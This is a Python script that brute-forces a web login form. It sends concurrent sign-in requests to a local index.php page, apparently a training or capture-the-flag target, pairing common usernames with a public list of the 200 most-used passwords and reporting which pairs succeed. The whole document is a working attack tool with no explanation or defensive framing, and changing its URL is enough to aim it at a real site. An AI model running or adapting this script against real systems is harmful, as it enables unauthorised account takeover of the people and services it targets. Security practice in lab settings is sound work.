import aiohttp
import asyncio
from colorama import Fore, Style


async def print_result(color, message, username, password):
    print(
        f"{color}[{message}] Username: {username} | Password: {password}{Style.RESET_ALL}"
    )


async def attempt_login(session, username, password):
    params = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login",
    }

    try:
        async with session.get(
            "http://localhost:8080/index.php", params=params, timeout=120
        ) as response:
            if response.status != 200:
                await print_result(Fore.YELLOW, "NON-200", username, password)
                return

            text = await response.text()
            if "WrongAnswer.gif" not in text:
                await print_result(Fore.GREEN, "SUCCESS", username, password)
            else:
                await print_result(Fore.RED, "FAILURE", username, password)

    except asyncio.TimeoutError:
        await print_result(Fore.RED, "TIMEOUT", username, password)


async def brute_force():
    usernames = ["admin", "root", "user"]
    passwords = sorted(
        line.strip()
        for line in open(
            "SecLists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt"
        ).readlines()
    )

    async with aiohttp.ClientSession() as session:
        tasks = []
        for username in usernames:
            for password in passwords:
                tasks.append(attempt_login(session, username, password))

        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(brute_force())
